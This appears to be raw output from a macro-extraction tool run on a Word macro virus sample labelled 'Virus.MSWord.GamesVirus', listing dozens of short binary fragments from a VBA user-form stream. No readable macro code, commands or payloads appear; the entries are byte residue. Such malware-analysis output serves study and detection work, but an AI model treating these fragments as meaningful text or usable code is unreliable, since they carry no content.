VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q2RiDci Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY"Rq!Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi!JaMk�*Ri"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba Ba)Ja2Ri Ba)JaEk�Ns�;Zy3Zy'9Y'9Q(Ba'9Q)Ja)Ja'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja BY BY2Rq BY BY(Ba)Ji(Ba BY<cy2Rq3Zy)Ja)Ji)Ji)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I)Ja2Rq*Ri2Ri3Zq'9Q2Rq*Ri)JaEk�*Ri)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! 798
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2RqDcq*Ri!Ji Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY Ba BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba1Ja)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY BY)JaUky1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ1Ji2Rq3Zq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BaDcq!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ja2Rq2Rq0Bq!Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba;ZqMky*Rq2Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q61(RRA)Ja2Ri2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BQ*Ri;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY'9Y2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y Bi(Ba)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a+Zq*Ri BY BY BY!Ja)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY(Ba BY2Rq+Zq BY(Bi*Ra;ZqDcyEk�Dc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ji)Ja)JY3Za!Ji3Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JYCZq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ja:Rq/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QDc�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq3Zq Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Jq!Jq'9Q Ba3ZyDc�3Zq Bi BY'9Q)Ji2RyNs�Ek�;Zy3Zy*Ri1Ji)Ja'9Y)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ji*Ri<c� Ba BY)Ji)Ji(Ba'9Q2Rq<c�'9Q BY2Rq2Rq1Jq2Rq)Ji)Ji&1Q)Ji'9Y2Rq2Ri1Ji)Ji)Ji2Rq!Ja(Ba2Rq3Zq2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)I'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I1Ja'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3Z�2Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y3Zq3Zq3Zq'9a&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY Ba%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y<cy BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Jq*RiDc�Vs�!Ja'9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A*Ri Baw{q:Rq)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Rq+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q2Ri)Ji2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba(Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q:Ra1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)JiLcy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY Bi(Bi Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq2Ri'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy2Rq0Ba)Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ja*Ri(Ba Ba*Ri!Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba*Ri2Rq!Ja Bi)Ji3Zq2Rq)Ja BY Bi!Ja!Ji2Rq2RaCZy)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(Ba(Ba!JY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY(Ba)Ji)Ji)Ji3Zq)Ja)Ja3Zq2Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji)Ji BY(Ba)Ji BY BY)Ja2Rq)Ji*Rq(BY BY)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BY*Ri<cq=ky BI BY3Zy3Zq)Ji'9Q!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ji"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq2Rq!Ja2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ji+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY BQ2Ra4cy*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji;Zy1Jq1Ji0Bq4cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Rq<cq*Ri1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q*Ri;Zq2Rq*Ri)Ji!Ji BY!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY*Ri*Ri*Ri!Ja3Zy*Rq)Ja2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ri*Rq2Ry Bi)Ji'9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Q.1Y BY BY)Ji Ba*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y B�*Ri*Ri)Ji BY Ba2Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ja!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY<cy*Ri!Ji3Zq=k�<c�Mk�)Ji)Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq3Zy;Zq<c�>s�3Zy;Zy;Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja*Ri2Rq)Ja)Ja*Ri2Rq BY2Ri'9Y)Ji BY3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja'9Q)Ja BY Ba)Ji2Rq BY2Rq3Zy*Ri)Ji)Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy BY)Ji)Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba)Ji"Rq!Ji)Ji(BY)Ji!Ja2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ji<c�=k�!Ji;Zy3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a Ba!Ji!Ja BY)Ji!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y Ba4cy3Zq&1Q1Jq)Ji*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QUk�2Ri2Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y1Ji(Bi!Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)JY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)JaDc�;Z�;Z�2Ry2Rq

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JY4cy<cy2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji3Zy*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja"RiNs�*Rq*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba Ba!Ja3Zy)JY)Ja!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y)Ja)Ja*Ri!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Ra Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba2Rq)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri Ba/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba3Zy)Ji*Rq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q)Ji BY Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A!Ji!Jq'9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
